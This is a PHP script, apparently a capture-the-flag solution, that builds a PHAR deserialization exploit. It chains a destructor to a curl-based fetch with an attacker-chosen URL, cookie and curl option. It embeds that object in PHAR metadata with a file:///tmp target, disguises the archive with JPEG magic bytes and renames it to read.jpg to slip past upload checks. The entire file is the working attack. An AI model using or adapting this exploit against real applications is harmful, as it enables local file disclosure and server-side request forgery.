<?php

class PreviewState {
    public $endpoint;
    private $headers;
    private $payload;
    private $sessionNote;

    function __construct($endpoint, $payload = '', $sessionNote = '', $headers = array()) {
        $this->endpoint = $endpoint;
        $this->payload = $payload;
        $this->sessionNote = $sessionNote;
        $this->headers = $headers;
    }

    function __wakeup() {
        if (empty($_SESSION['admin'])) {
            $this->sessionNote = 'discarded';
            $this->headers = [CURLOPT_USERAGENT => 'discarded'];
            return;
        }
        if (empty($_SESSION['superadmin'])) {
            $this->headers = [CURLOPT_USERAGENT => 'discarded'];
        }
    }

    function flush() {
        if (session_status() === PHP_SESSION_ACTIVE) {
            session_write_close();
        }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->endpoint);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        if (!empty($this->payload)) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $this->payload);
        }

        if (!empty($this->sessionNote)) {
            curl_setopt($ch, CURLOPT_COOKIE, $this->sessionNote);
        }

        if (!empty($this->headers)) {
            $option = array_key_first($this->headers);
            $value = $this->headers[$option];
            curl_setopt($ch, $option, $value);
        }

        $output = curl_exec($ch);
        echo $output;
        curl_close($ch);
    }
}

class PendingPreview {
    public $state;

    function __construct($state) {
        $this->state = $state;
    }

    function __destruct() {
        if ($this->state instanceof PreviewState) {
            $this->state->flush();
        }
    }
}

$phar = new Phar("read.phar");
$phar->startBuffering();
$phar->addFromString("x.jpg", "x");
$o = new PendingPreview(new PreviewState("file:///tmp/.review_rotation_cache"));
$phar->setMetadata($o);
$phar->setStub("\xff\xd8\xff\xe0<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();

rename("read.phar", "read.jpg");
?>

